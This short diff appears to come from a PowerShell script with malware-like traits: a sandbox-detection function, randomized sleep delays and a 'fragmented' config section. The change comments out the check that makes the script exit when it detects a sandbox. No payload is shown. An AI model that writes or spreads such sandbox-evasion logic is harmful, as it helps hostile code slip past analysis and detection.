@@ -36,7 +36,7 @@ function Test-Sandbox {
 }
 
 Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 7)
-if (Test-Sandbox) { Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30); return }
+# if (Test-Sandbox) { Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30); return }
 
 # === CONFIG (fragmented) ===
 $c = @{}
